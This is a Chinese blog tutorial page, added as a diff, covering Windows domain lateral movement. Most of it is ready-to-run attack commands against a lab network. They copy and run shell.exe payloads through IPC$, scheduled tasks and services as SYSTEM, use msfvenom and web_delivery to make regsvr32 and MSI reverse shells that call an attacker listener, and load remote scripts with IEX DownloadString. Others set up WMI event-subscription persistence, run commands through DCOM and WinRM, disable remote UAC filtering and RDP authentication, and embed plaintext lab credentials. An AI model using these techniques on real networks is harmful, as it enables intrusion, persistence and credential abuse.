@@ -1,0 +1,525 @@
+<!DOCTYPE html>
+<html>
+  <head>
+    <meta charset="utf-8" >
+
+<title>内网渗透体系建设--第5章--横向移动上(基础知识) | he11的农场</title>
+
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=no">
+
+<link rel="stylesheet" href="https://use.fontawesome.com/releases/v5.7.2/css/all.css" integrity="sha384-fnmOCqbTlWIlj8LyTjo7mOUStjsKC4pOpQbqyi7RrhN7udi9RwhKkMHpvLbHG9Sr" crossorigin="anonymous">
+<link rel="shortcut icon" href="https://dydydy123.github.io/favicon.ico?v=1686555449410">
+<link rel="stylesheet" href="https://dydydy123.github.io/styles/main.css">
+
+
+
+<link rel="stylesheet" href="https://unpkg.com/aos@next/dist/aos.css" />
+<script src="https://cdn.jsdelivr.net/npm/vue/dist/vue.js"></script>
+
+
+
+    <meta name="description" content="1 横向移动中的文件传输
+1.1 通过网络共享：
+net share 获取系统默认开启的网络共享
+
+C：C盘共享。ADMIN：C盘共享。
+ADMIN：C盘共享。ADMIN：系统目录共享。
+IPC$：“命名管道”资源共享。
+其中主要值得我们注..." />
+    <meta name="keywords" content="" />
+  </head>
+  <body>
+    <div id="app" class="main">
+
+      <div class="sidebar" :class="{ 'full-height': menuVisible }">
+  <div class="top-container" data-aos="fade-right">
+    <div class="top-header-container">
+      <a class="site-title-container" href="https://dydydy123.github.io">
+        <img src="https://dydydy123.github.io/images/avatar.png?v=1686555449410" class="site-logo">
+        <h1 class="site-title">he11的农场</h1>
+      </a>
+      <div class="menu-btn" @click="menuVisible = !menuVisible">
+        <div class="line"></div>
+      </div>
+    </div>
+    <div>
+      
+        
+          <a href="/" class="site-nav">
+            首页
+          </a>
+        
+      
+        
+          <a href="/archives" class="site-nav">
+            归档
+          </a>
+        
+      
+        
+          <a href="/tags" class="site-nav">
+            标签
+          </a>
+        
+      
+        
+          <a href="/post/about" class="site-nav">
+            关于
+          </a>
+        
+      
+        
+          <a href="https://dydydy123.github.io/post/you-lian" class="site-nav">
+            友链
+          </a>
+        
+      
+    </div>
+  </div>
+  <div class="bottom-container" data-aos="flip-up" data-aos-offset="0">
+    <div class="social-container">
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+    </div>
+    <div class="site-description">
+      ganma~~~~~~~~~~
+    </div>
+    <div class="site-footer">
+       | <a class="rss" href="https://dydydy123.github.io/atom.xml" target="_blank">RSS</a>
+    </div>
+  </div>
+</div>
+
+
+      <div class="main-container">
+        <div class="content-container" data-aos="fade-up">
+          <div class="post-detail">
+            <h2 class="post-title">内网渗透体系建设--第5章--横向移动上(基础知识)</h2>
+            <div class="post-date">2023-04-13</div>
+            
+              <div class="feature-container" style="background-image: url('https://dydydy123.github.io/post-images/nei-wang-shen-tou-ti-xi-jian-she-di-5-zhang-heng-xiang-yi-dong.jpg')">
+              </div>
+            
+            <div class="post-content" v-pre>
+              <h1 id="1-横向移动中的文件传输">1 横向移动中的文件传输</h1>
+<p><strong>1.1 通过网络共享：</strong></p>
+<pre><code>net share 获取系统默认开启的网络共享
+</code></pre>
+<p>C<span class="katex"><span class="katex-mathml"><math><semantics><mrow><mi mathvariant="normal">：</mi><mi>C</mi><mi mathvariant="normal">盘</mi><mi mathvariant="normal">共</mi><mi mathvariant="normal">享</mi><mi mathvariant="normal">。</mi><mi>A</mi><mi>D</mi><mi>M</mi><mi>I</mi><mi>N</mi></mrow><annotation encoding="application/x-tex">：C盘共享。
+ADMIN</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.68333em;vertical-align:0em;"></span><span class="mord cjk_fallback">：</span><span class="mord mathdefault" style="margin-right:0.07153em;">C</span><span class="mord cjk_fallback">盘</span><span class="mord cjk_fallback">共</span><span class="mord cjk_fallback">享</span><span class="mord cjk_fallback">。</span><span class="mord mathdefault">A</span><span class="mord mathdefault" style="margin-right:0.02778em;">D</span><span class="mord mathdefault" style="margin-right:0.10903em;">M</span><span class="mord mathdefault" style="margin-right:0.07847em;">I</span><span class="mord mathdefault" style="margin-right:0.10903em;">N</span></span></span></span>：系统目录共享。<br>
+IPC$：“命名管道”资源共享。</p>
+<p><code>其中主要值得我们注意的是IPC$共享：</code><br>
+IPC是共享命名管道的资源, 为了进程间通信而开放的命名管道, 通过提供的用户名和口令, 连接双方可以建立安全的通道并在这个通道内进行加密数据交换, 从而实现对远程计算机的远程访问。</p>
+<p>通过建立IPC$连接, 不仅可以进行文件共享操作, 还可以实现其他远程管理操作, 如列出远程主机进程, 在远程主机上创建计划任务, 在远程主机上创建系统服务。</p>
+<p><code>建立IPC$连接的条件:</code><br>
+远程主机开启IPC$连接<br>
+远程主机开放139或445端口</p>
+<pre><code>net use \\192.168.52.138\IPC$ &quot;Qwer123&quot; /user:&quot;liukaifeng01&quot;   # 连接远程主机(DC)的IPC
+#net use \\&lt;IP&gt;\IPC$&lt;password&gt; /user:&lt;username&gt;
+ 
+dir \\192.168.52.138\C$  #列出远程主机的C盘共享目录
+
+copy shell.exe \\192.168.52.138\C$   #复制exp到目标计算机
+
+
+</code></pre>
+<p><strong>1.2 搭建SMB服务器：</strong><br>
+https://3gstudent.github.io/%E6%B8%97%E9%80%8F%E6%8A%80%E5%B7%A7-%E9%80%9A%E8%BF%87%E5%91%BD%E4%BB%A4%E8%A1%8C%E5%BC%80%E5%90%AFWindows%E7%B3%BB%E7%BB%9F%E7%9A%84%E5%8C%BF%E5%90%8D%E8%AE%BF%E9%97%AE%E5%85%B1%E4%BA%AB</p>
+<pre><code>Set-ExecutionPolicy RemoteSigned
+
+Import-Module C:\Users\liukaifeng01\Desktop\Invoke-BuildAnonymousSMBServer.ps1
+#导入模块
+
+Get-Command
+#查看模块 
+
+Invoke-BuildAnonymousSMBServer -Path c:\ -Mode Enable #开启
+Invoke-BuildAnonymousSMBServer -Path c:\ -Mode Disable #关闭
+
+需建立IPC连接
+dir \\192.138.52.138\smb
+
+</code></pre>
+<p><strong>1.3 windows自带工具：</strong><br>
+1.Certutil：</p>
+<pre><code>certutil -urlcache -split -f http://192.168.52.138:80/1.png C:\1.png
+
+</code></pre>
+<p>2.BITSAdmin：</p>
+<pre><code>bitsadmin /transfer test http://192.168.52.138:80/1.png C:\2.png
+</code></pre>
+<p>3.Powershell：<br>
+WebClient对象实现文件下载：</p>
+<pre><code>powershell.exe -exec bypass -Command &quot;(New-Object New Net.WebClient).DownloadFile('http://192.168.52.138:80/1.png','C:\3.png')&quot;
+
+</code></pre>
+<h1 id="2创建计划任务">2.创建计划任务</h1>
+<p><strong>2.1常规流程</strong><br>
+利用已建立的IPC连接上传payload。<br>
+利用已建立的IPC连接或指定用户凭据的方式在远程主机上创建计划任务。</p>
+<pre><code>1.建立连接
+net use \\&lt;IP&gt;\IPC$ &lt;password&gt; /user:&lt;username&gt;   # 和目标主机建立IPC连接
+ 
+schtasks /Create /S &lt;TargetIP&gt; /TN 任务名 /SC minute /MO 1 /TR &lt;PayloadPath&gt; /RU System /F    #在目标主机添加计划任务
+# /S  指定要连接的系统
+# /TN 指定要创建的计划任务名称
+# /SC 指定计划任务执行频率
+# /MO 指定计划任务周期
+# /TR 指定计划任务运行的程序路径
+# /RU 指定计划任务运行的用户权限
+# /F  如果指定的任务已存在,则强制执行
+schtasks /RUN /S 192.168.52.138 /I /TN Backdoor   #立即启动计划任务
+schtasks /Delete /S &lt;TargetIP&gt; /TN Backdoor /F    #删除计划任务
+ 
+#建立连接
+net use \\192.168.52.138\IPC$ &quot;Qwer123&quot; /user:&quot;liukaifeng01&quot;
+#执行命令
+schtasks /Create /S 192.168.52.138 /TN Backdoor /SC minute /MO 1 /TR &quot;C:\Windows\System32\cmd.exe /c 'whoami &gt; C:\222.txt '&quot; /RU System /F
+#查看命令执行结果
+type \\192.168.52.138\c$\222.txt
+
+#建立反向连接
+schtasks /Create /S 192.168.52.138 /TN Backdoor /SC minute /MO 1 /TR C:\shell.exe /RU System /F
+
+copy C:\shell.exe \\192.168.30.10\C$\shell.exe
+
+2.未建立连接需要指定凭证：
+schtasks /Create /S &lt;TargetIP&gt; /TN 任务名 /SC minute /MO 1 /TR &lt;PayloadPath&gt; /RU System /F /U username /P password 
+</code></pre>
+<p><strong>2.2 UNC路径加载执行</strong></p>
+<pre><code>schtasks /Create /S &lt;TargetIP&gt; /TN Backdoor /SC minute /MO 1 /TR \\&lt;SMBServerIP&gt;\&lt;SMBServerName&gt;\&lt;PayloadPath&gt; /RU System /F  /U &quot;&lt;SMBUsername&gt;&quot; /P &quot;&lt;SMBPassword&gt;&quot; 
+#在目标主机添加计划任务并直接指定UNC路径和smb服务登录凭据
+
+schtasks /Create /S 192.168.52.138 /TN Backdoor /SC minute /MO 1 /TR \\192.168.52.138\smb\shell.exe /RU System /F  /U &quot;&lt;SMBUsername&gt;&quot; /P &quot;&lt;SMBPassword&gt;&quot; 
+
+schtasks /RUN /S 192.168.52.138 /I /TN Backdoor
+
+</code></pre>
+<p><img src="https://dydydy123.github.io/post-images/1681373863276.png" alt="" loading="lazy"><br>
+<img src="https://dydydy123.github.io/post-images/1681373925621.png" alt="" loading="lazy"></p>
+<h1 id="3-利用系统服务">3 利用系统服务</h1>
+<p><strong>3.1 创建远程服务</strong></p>
+<pre><code>net use \\192.168.52.138\IPC$ &quot;Qwer123&quot; /user:&quot;liukaifeng01&quot;
+
+sc \\&lt;TargetIP&gt; create &lt;ServerName&gt; binpath= &quot;cmd.exe /k &lt;PayloadPath&gt;&quot; #创建远程服务
+ 
+sc \\&lt;TargetIP&gt; start &lt;ServerName&gt;  #开启服务
+ 
+sc \\&lt;TargetIP&gt; delete &lt;ServerName&gt; #删除服务
+
+sc \\192.168.52.138 create name binpath= &quot;C:\Windows\System32\cmd.exe /k C:\shell.exe&quot;
+sc \\192.168.52.138 create name binpath= &quot;C:\Windows\System32\cmd.exe /c  whoami &gt; C:\123.txt&quot;
+sc \\192.168.52.138 start name  #开启服务
+sc \\192.168.52.138 delete name
+</code></pre>
+<p><strong>3.2 SCShell</strong></p>
+<pre><code>SCShell.exe 192.168.30.10 XblAuthManager &quot;C:\Windows\System32\cmd.exe /c calc&quot; &quot;h0cksr.bxs&quot; &quot;administrator&quot; &quot;adminDC#@123&quot;
+# SCShell.exe &lt;TargetIP&gt; &lt;ServiceName&gt; &lt;PayloadPath&gt; &lt;Domain&gt; &lt;Username&gt; &lt;Password&gt;
+ 
+#msf生成一个攻击服务
+msfconsole
+use exploit/multi/script/web_delivery
+set payload payload/windows/x64/meterpreter/reverse_tcp
+set lhost 192.168.52.132    #msf服务ip
+set lport 4444  #msf监听反弹shell端口
+set target Regsvr32
+run #运行后任务会自动转到后台, 可以通过jobs查看
+ 
+#靶机上执行下面命令加载msf指定的payload后会反弹shell
+regsvr32 /s /n /u /i:http://192.168.92.128:8080/gDvWiNXOAjC.sct scrobj.dll
+ 
+#指定远程服务执行命令
+SCShell.exe 192.168.52.138 XblAuthManager &quot;C:\Windows\System32\cmd.exe /c C:\Windows\System32\regsvr32.exe /s /n /u /i:http://192.168.52.132:8080/6R5aLR1tX56N.sct scrobj.dll&quot; god.org liukaifeng01 Qwer123
+</code></pre>
+<p><strong>3.3 UACRemote Restrictions(远程限制)</strong><br>
+简单说就是微软在Windows Vista之后为了更好管理和保护本地管理员组成员的用户, 引入了远程限制, 此机制有助于防止本地恶意软件以管理员权限远程执行(被通过远程的方式调用), 所以只允许RID 500(administrator)这个本地管理员组用户, 其他的用户均会拒绝访问(域管理员用户不受限)。</p>
+<p>Psexec、WMI、WinRM、PTH哈希传递都只能使用RID 500(administrator)本地管理员用户。</p>
+<p>可以通过执行下面命令后重启系统来关闭远程限制</p>
+<pre><code>reg add HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /v LocalAccountTokenFilterPolicy /t REG_DWORD /d 1 /f
+</code></pre>
+<h1 id="4远程桌面应用">4.远程桌面应用</h1>
+<p><strong>4.1远程桌面的确定与开启：</strong></p>
+<pre><code>reg query &quot;HKLM\SYSTEM\CurrentControlSet\Control\Terminal Server&quot; /v fDenyTSConnections   # 查询是否已开启远程桌面,显示0x0则已开启,0x1表示未开启
+ 
+reg add &quot;HKLM\SYSTEM\CurrentControlSet\Control\Terminal Server&quot; /v fDenyTSConnections /t REG_DWORD /d 0 /f    # 开启远程桌面连接
+ 
+reg add &quot;HKLM\SYSTEM\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp&quot; /v UserAuthentication /t REG_DWORD /d 0   #关闭&quot;仅允许运行使用网络级别身份验证的远程桌面的计算机连接&quot;(鉴权)
+ 
+netsh advfirewall firewall add rule name=&quot;Remote Desktop&quot; protocol=TCP dir=in localport=3389 action=allow # 设置防火墙放行3389端口
+</code></pre>
+<p>对于远程主机：</p>
+<pre><code>wmic /Node:192.168.52.138 /User:liukaifeng01 /Password:Qwer123 RDTOGGLE WHERE ServerName='owa' call SetAllowTSConnections 1
+</code></pre>
+<p><strong>4.2 RDP Hijacking</strong><br>
+如果已获得靶机SYSTEM权限就可以劫持其他用户的RDP会话, 在未授权情况下登入目标系统(即使该用户的会话已断开), 这种攻击方法就是RDP Hijacking(桌面劫持)</p>
+<p>tscon命令提供切换用户会话的功能, 正常情况下切换用户会话就需要提供切换目标的登录密码, 但是SYSTEM就绕过了这个验证的步骤.</p>
+<p>所以攻击步骤如下:</p>
+<p>登录一个一般权限用户的RDP<br>
+使用工具提权为SYSTEM<br>
+执行query user查看主机会话记录<br>
+SYSTEM权限执行tscon <ID>切换到另一个用户的RDP会话</p>
+<pre><code>query user     #查看主机会话记录
+tscon &lt;ID&gt;    #SYSTEM绕过身份验证直接切换其他用户切换会话
+</code></pre>
+<p><strong>4.3 SharpRDP</strong><br>
+https://github.com/0xthirteen/SharpRDP<br>
+不需要代理即可使用用户凭证进行远程桌面命令执行。</p>
+<h1 id="5-psexec-远程控制">5 PsExec 远程控制</h1>
+<p>PsExec(https://learn.microsoft.com/zh-cn/sysinternals/downloads/psex ec)是微软官方提供的Windows远程控制工具, 可以根据凭据在远程系统上执行管理操作, 工具使用原理如下(和SCShell差不多):</p>
+<p><code>通过SMB连接到Admin$共享</code><br>
+<code>释放psexesvc.exe二进制文件</code><br>
+<code>注册一个PSEXESVC服务</code><br>
+<code>客户端执行命令时, PSEXESVC服务启动响应进程执行命令并回显结果</code><br>
+<code>运行结束后将PSEXESVC服务删除</code></p>
+<p>使用条件:</p>
+<p><code>1.远程主机开启Admin$共享</code><br>
+<code>2.远程主机关闭防火墙/放行445端口</code></p>
+<pre><code>PsExec.exe -accepteula \\&lt;TargetIP&gt; -u &lt;SubDomain&gt;\&lt;Username&gt; -p &quot;&lt;Password&gt;&quot; -s cmd.exe
+# -accepteula 禁止弹出许可对话框
+# -u 指定远程用户主机名
+# -p 指定用户密码
+# -s 以SYSTEM权限,未指定的话就是以管理员权限运行
+ 
+PsExec.exe -accepteula \\&lt;TargetIP&gt; cmd.exe   #如果之前已经通过net use建立了IPC连接就不需要指定账号密码了
+</code></pre>
+<h1 id="6-wmi-的利用">6 WMI 的利用</h1>
+<p>WMI(Windows Management Instrumentation,Windwos 管理规范)是一项核心的Windows管理技术, 用户可以通过WMI管理本地和远程计算机。Windows为远程传输WMI数据提供了两个可用协议, 即为DCOM(分布式对象组件模型), 和WinRM(Windows远程管理), 使得WMI对象的查询、事件注册、WMI类方法执行和类创建操作都能远程执行。</p>
+<p>在远程主机上创建进程(Win32_Process类的Create方法)<br>
+在远程主机安装恶意msi(Win32_Product类的Install方法)<br>
+远程部署WMI订阅事件<br>
+WMI横向条件:</p>
+<p>远程主机的WMI服务为开启状态(默认开启)<br>
+远程主机防火墙关闭/放行135端口(WMI管理的默认端口)</p>
+<p><strong>6.1 常规利用方法</strong><br>
+<code>1.执行远程查询</code></p>
+<pre><code>wmic /node:192.168.52.138 /user:user /password:passwd process list brief   #查询远程主机的进程信息
+</code></pre>
+<p><code>2.创建远程进程</code></p>
+<pre><code>wmic /node: /user: /password: process create &quot;cmd.exe /c ipconfig &gt; C:\1.txt&quot;    #远程主机上创建新进程
+</code></pre>
+<p><code>3.远程安装MSI文件</code></p>
+<pre><code>msfvenom -p windows/x64/meterpreter/reverse_http LHOST=192.168.92.130 LPORT=80 -f msi -o reverse_http_80.msi 
+#生成msi的paylaod
+ 
+python3 msbserver.py evilsmb pwd -smb2support   
+ #在kali开启一个smb服务使paylaod被访问到
+ 
+wmic /node:192.168.52.138 /user:user /password:passwd product call install PackageLocation=&quot;\\IP\evilsmb\reverse_http_80.msi&quot; 
+#靶机远程获取kali的smb服务中的payload进行加载
+</code></pre>
+<p><strong>6.2 常见利用工具</strong><br>
+<code>1.wmiexec</code><br>
+Impacket项目的wmiexec.py能够以全交互或半交互的方式通过WMI在远程主机执行命令, 条件是需要远程主机开放135和445端口, 这两个端口分别用于WMI管理执行命令(135)和将命令执行结果返回或搭建交互管道(445)</p>
+<pre><code>python3 wmiexec.py H0CKSR/Administrator:adminDC#\@123@192.168.30.10  
+#从远程主机获取交互式的shell
+python3 wmiexec.py &lt;domain&gt;/&lt;username&gt;:&lt;passwd&gt;@&lt;IP&gt;
+wmiexec.exe &lt;domain&gt;/&lt;username&gt;:&lt;passwd&gt;@&lt;IP&gt;
+</code></pre>
+<p><code>2.Invoke-WMICommand</code><br>
+Invoke-WMICommand.ps1是PowerSploite项目中的一个脚本可以通过powersehll调用wmi执行命令(Powershell内置的Invoke-WMIMethod也可以远程执行命令或程序), 但是没有执行结果的回显</p>
+<pre><code>IEX(New-Object Net.Webclient).DownloadString('http://IP:PORT/Invoke-WMICommand.ps1') 
+#加载远程脚本
+User = 'H0CKSR\Administrator' 
+#指定远程系统用户名
+Password = ConvertTo-SecureString -String 'adminDC#@123' -AsPlainText -Force    #指定用户密码
+Cred = New-Object -TypeName System.Management.Automation.PSCredential -ArgumentListUser,Password 
+#将用户名和密码整合以便导入
+CredentialRemote = Invoke-WmiCommand -Payload {ipconfig} -Credential Cred -ComputerName '192.168.30.10'  
+#指定远程主机IP和要执行的命令
+Remote.PayloadOutput    
+#执行命令并输出结果
+整合一下到一句话里面就是:
+powershell.exe -exec bypass -Command &quot;IEX(New-Object Net.Webclient).DownloadString('http://IP:PORT/Invoke-WMICommand.ps1');User = 'H0CKSR\Administrator';Password = ConvertTo-SecureString-String 'adminDC#@123' -AsPlainText -Force;Cred = New-Object -TypeName System.Management.Automation.PSCredential -ArgumentListUser,Password;Remote = Invoke-WmiCommand -Payload {ipconfig} -Credential $Cred -ComputerName '';$Remote.PayloadOutput&quot;
+</code></pre>
+<p><strong>6.3 WMI 事件订阅的利用</strong><br>
+触发事件的具体条件 — 事件过滤器<br>
+对指定事件做出响应 — 事件消费者</p>
+<p>所有的事件过滤器都被存储为一个ROOT\subscription:__EventFilter对象的实例, 并在特定事件发生时执行任意代码或系统命令。</p>
+<p>使用WMI事件消费类的ActiveScriptEventConsumer和CommandLineEventConsumer, 可以在远程主机上执行任何攻击payload。</p>
+<p>该技术既可以用于持久化也可以用于横向移动, 且需要提供远程主机的管理员权限的用户凭据。</p>
+<p><code>1.手动利用：</code><br>
+1整合PSCredential用于后续过程验证<br>
+2设置攻击目标和其它公共参数<br>
+3在远程主机上部署事件过滤器<br>
+4部署事件消费者<br>
+5将创建的过滤器和事件消费者绑定在一起</p>
+<p><code>2.Sharp-WMIEvent</code><br>
+开启SMB服务共享放置payload<br>
+跳板机上使用Sharp-WMIEvent即可创建一个随机命名的永久事件订阅,每隔60s执行一个smb的payload</p>
+<pre><code>Set-ExecutionPolicy RemoteSigned
+
+Import-Module Sharp-WMIEvent.spl
+
+Sharp-WMIEvent -Trigger Interval -IntervalPeriod 60 -ComputerName &lt;tagertIP&gt; -Domain god.org -Username Administrator -Password passwd -Command &quot;cmd.exe /c \\smbIP\evilsmb\reverse_tcp.exe&quot; 
+#本机添加订阅事件(用于维权)
+ 
+
+Sharp-WMIEvent -Trigger Interval -IntervalPeriod 60 -ComputerName 192.168.52.138 -Domain god.org -Username liukaifeng01 -Password Qwer123 -Command &quot;cmd.exe /c \\smbIP\evilsmb\reverse_tcp.exe&quot; 
+</code></pre>
+<h1 id="7-dcom的利用">7 DCOM的利用</h1>
+<p><strong>7.1 COM和DCOM</strong><br>
+<code>COM(组件对象模型)</code><br>
+COM由一组构造规范和组件对象组成。COM组件对象通过接口描述自身，组件提供的服务都通过接口公开。接口就是一组函数指针表。每个指针初始化指向某个具体的函数体，一个组件对象实现的接口数量没有限制。COM指定了一个对象模型和编程要求，使COM对象能够与其他对象交互(交互的不同对象可以跨进程和跨主机)</p>
+<p><code>CLSID</code><br>
+在前面potato提权部分有说到寻找可用的COM对象，指定COM对象的方式就是指定COM对象的CLSID，这个CLSID是什么呢？</p>
+<p>Windows中每个COM对象都由一个128位二进制标识符标识（GUID）</p>
+<p>当GUID用于标识COM对象的时候就称为CLSID（类标识符）<br>
+当GUID用于标识接口时称为IID（接口标识符）<br>
+一些CLSID还有ProgID方便记忆</p>
+<p><code>DCOM(分布式组件对象模型)</code><br>
+DCOM是基于COM的一系列概念和程序接口支持组件之间跨主机通信。</p>
+<p>DCOM是COM的拓展, 允许应用程序实例化和访问远程主机上的COM对象的属性和方法。</p>
+<p>DCOM通过RPC技术将COM的功能拓展到本地之外,因此远程主机上托管COM服务端的软件可以通过PRC技术想客户端公开其方法。</p>
+<p><strong>7.2 通过DCOM横向移动</strong><br>
+https://cloud.tencent.com/developer/article/1902580</p>
+<pre><code>Get-CimInstance Win32_DCOMApplication   
+#列出计算机上全部的DCOM组件
+</code></pre>
+<p>DCOM组件公开的接口中可能包含不安全的方法:</p>
+<p>MMC20.Application提供的ExecuteShellCommand方法可以在单独的进程中运行指定的程序或命令</p>
+<p>目前常用的DCOM组件:</p>
+<p>MMC20.Application,ShellWindows,Excel.Application,ShellBrowserWindow…</p>
+<p><code>与远程主机的DCOM交互的条件:</code></p>
+<p>1.拥有管理员权限的powershell<br>
+2.远程主机防火墙关闭</p>
+<p><code>1.MMC20.Application利用：</code></p>
+<pre><code>python3 smbserver.py evilsmb pwd -smb2support -username 1 -password 1
+ 
+powershell.exe -exec bypass -Command &quot;$om = [activator]::CreateInstance([type]::GetTypeFromProgID('MMC20.Application','192.168.52.138'));com.Document.ActiveView.ExecuteShellCommand('cmd.exe',$null,'/c \\192.168.52.138\evilsmb\reverse_http_80.exe','Minimized')&quot;
+ 
+ #获取对象
+$com = [activator]::CreateInstance([type]::GetTypeFromProgID('MMC20.Application','127.0.0.1'));
+
+#查看对象方法：
+$com.Document.ActiveView | Get-Member
+
+$com.Document.ActiveView.ExecuteShellCommand('cmd.exe',$null,'/c calc.exe','Minimized')
+</code></pre>
+<p><code>2.ShellWindows</code></p>
+<pre><code>$com = [activator]::CreateInstance([type]::GetTypeFromCLSID('9BA05972-F6A8-11CF-A442-00A0C90A8F39','127.0.0.1'));
+ 
+$com.item().Document.Application | Get-Member
+
+$com.item().Document.Application.ShellExecute('cmd.exe','/c calc.exe','C:\Windows\System32',$null,0)
+</code></pre>
+<p>ShellWindows组件提供了Document.Application.ShellExecute方法可以启动子进程来运行指定的程序或系统命令</p>
+<p>oleviewdotnet：https://github.com/tyranid/oleviewdotnet/releases<br>
+ShellWindows对象没有ProgID, 可以通过工具oleviewdotnet根据组件名获取到对象的CLSID,然后在ps中通过GetTypeFromCLSID函数创建对象实例。</p>
+<p><code>3.ShellBrowserWindow</code></p>
+<pre><code>$com = [activator]::CreateInstance([type]::GetTypeFromCLSID('C08AFD90-F2A1-11D1-8455-00A0C91F3880','127.0.0.1'));
+
+$com.Document.Application.ShellExecute('cmd.exe','/c calc.exe','C:\Windows\System32',$null,0);
+</code></pre>
+<p>ShellBroswerWindow中也存在一个Document.Application.ShellExecute方法,和ShellWindows一样, 但不会创建新进程, 而是通过已有的explorer.exe来托管子进程。该方法只适用于Win10和WinServer2012等系统版本</p>
+<h1 id="8-winrm-的利用">8 WinRM 的利用</h1>
+<p>WinRM通过WS-Management协议(用于远程管理软硬件的web协议)使用5985端口实现远程连接, 在开启WinRM服务后防火墙会自动方向相关端口从而让远程主机对其进行远程管理(WinServer2008以上的服务器中WinRM才会自启动)。使用WinRM横移需要有远程主机的管理员凭据信息(账号密码)。<br>
+<strong>8.1 通过WinRM执行远程命令</strong><br>
+1.Winrs<br>
+Windows远程管理提供的客户端程序, 运允许通过提供的用户凭据, 在允许WinRM的服务器上执行系统命令。要求双方都安装WinRM服务,使用WS-Management.</p>
+<pre><code>winrm set winrm/config/client @{TrustedHosts=&quot;192.168.52.138&quot;}
+#将目标主机添加到TrustedHosts列表
+ 
+powershell -exec bypass -Command &quot;Set-Item WSMan:localhost\client\trustedhosts -value *&quot;  
+#通过powersehll将所有主机加入到TrustedHosts
+ 
+winrs.exe -r:http://192.168.30.14:5985 -u:administrator -p:adminDC#@123 &quot;whoami&quot;
+ 
+#winrs.exe -r:http://:5985 -u:administrator -p: &quot;&quot;  #执行命令
+</code></pre>
+<p>2.Winrm(Winrm.cmd)<br>
+内置管理命令行工具, 允许管理员配置本机的WinRM服务</p>
+<p>默认无法通过Winrm连接到目标系统,</p>
+<p>1.传输为HTTPS或目标位于TrustedHosts列表中并且提供了显式凭据</p>
+<p>2.使用winrm.cmd配置TrustedHosts(列表中的计算机可能未经过身份验证,相关设置方法通过winrm help config查看)</p>
+<pre><code>winrm.exe invoke create wmicimv2/win32_process -SkipCAcheck -skipCNcheck @{commandline=&quot;cmd.exe&quot;} -r:http://ip:5985 -u:administrator -p:adminDC#@123
+</code></pre>
+<p><strong>8.2 通过WinRM获取交互式会话</strong><br>
+1.Powersehll下的利用</p>
+<p>PowerShell的远程传输协议基于WinRM规范, 同时提供了强大的远程管理功能。</p>
+<p>Enter-PSSession的PowerShell Cmdlet可以启动与远程主机的会话。在会话交互期间, 用户输入的命令在远程计算机上运行, 就像直接在远程计算机上输入一样。</p>
+<p>跳板机上执行下面命令:</p>
+<p><code>1.跳板机与远程主机建立会话连接</code></p>
+<pre><code>$User = 'H0CKSR\Administrator' #指定远程系统用户名
+$Password = ConvertTo-SecureString -String 'adminDC#@123' -AsPlainText -Force    #指定用户密码
+$Cred = New-Object -TypeName System.Management.Automation.PSCredential -ArgumentList $User,$Password #将用户名和密码整合以便导入Credential
+New-PSSession -Name WinRMI -ComputerName  -Credential Cred -Port 5985
+ 
+# -Name 指定创建的会话名称
+# -ComputerName 指定要连接的主机IP或主机名
+# -Credential 指定有权连接到直接的用户凭据
+# -Port 指定WinRM工作端口
+</code></pre>
+<p><code>2.跳板机在ps中执行Get-PSSession命令查看当前已创建的PSSession会话</code></p>
+<p><code>3.跳板机通过ps命令选中任意一个会话进入交互模式</code><br>
+第一种就是获取交互:</p>
+<pre><code>Enter-PSSession -Name WinRM1  
+</code></pre>
+<p>第二种就是直接执行命令来加载payload：</p>
+<pre><code>$User = 'H0CKSR\Administrator' #指定远程系统用户名
+$Password = ConvertTo-SecureString -String 'adminDC#@123' -AsPlainText -Force    #指定用户密码
+$Cred = New-Object -TypeName System.Management.Automation.PSCredential -ArgumentList $User,$Password #将用户名和密码整合以便导入Credential
+$Sess = New-PSSession -Name WinRMI -ComputerName  -Credential Cred -Port 5985
+Invoke-Command -SessionSess -ScriptBlock {  dir c:\ }
+ 
+# -Name 指定创建的会话名称
+# -ComputerName 指定要连接的主机IP或主机名
+# -Credential 指定有权连接到直接的用户凭据
+# -Port 指定WinRM工作端口
+</code></pre>
+
+            </div>
+            
+            
+              <div class="next-post">
+                <div class="next">下一篇</div>
+                <a href="https://dydydy123.github.io/post/nei-wang-shen-tou-ti-xi-jian-she-di-2-zhang-quan-xian-ti-sheng/">
+                  <h3 class="post-title">
+                    内网渗透体系建设--第4章--权限提升
+                  </h3>
+                </a>
+              </div>
+            
+
+            
+
+          </div>
+
+        </div>
+      </div>
+    </div>
+
+    <script src="https://unpkg.com/aos@next/dist/aos.js"></script>
+<script type="application/javascript">
+
+AOS.init();
+
+var app = new Vue({
+  el: '#app',
+  data: {
+    menuVisible: false,
+  },
+})
+
+</script>
+
+
+  <script src="//cdn.jsdelivr.net/gh/highlightjs/cdn-release@11.5.1/build/highlight.min.js"></script>
+  <script>
+    hljs.initHighlightingOnLoad()
+  </script>
+
+
+
+
+
+  </body>
+</html>
